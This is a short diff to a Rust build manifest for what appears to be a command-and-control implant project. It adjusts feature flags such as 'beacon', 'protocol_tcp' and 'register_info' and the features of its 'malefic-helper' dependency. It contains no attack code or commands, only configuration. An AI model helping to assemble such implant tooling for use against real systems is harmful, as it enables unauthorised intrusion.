@@ -18,8 +18,8 @@ protocol_tls = []
 protocol_wireguard = []
 
 
-default = ["beacon", "protocol_tcp", "register_info"]
-template = ["beacon", "protocol_tcp"]
+default = ["beacon", "register_info", "protocol_tcp"]
+template = ["beacon"]
 
 [profile.dev]
 opt-level = 1
@@ -52,10 +52,7 @@ thiserror = "1.0.58"
 lazy_static = "1.4.0"
 
 malefic-modules = { path = "../malefic-modules", features = [ "default" ] }
-malefic-helper = { path= "../malefic-helper", features = [
-    "Common_Transport_Tcp",
-    "Win"
-] }
+malefic-helper = { path= "../malefic-helper", features = [ "default" ] }
 
 [dependencies.async-std]
 version = "1.7.0"
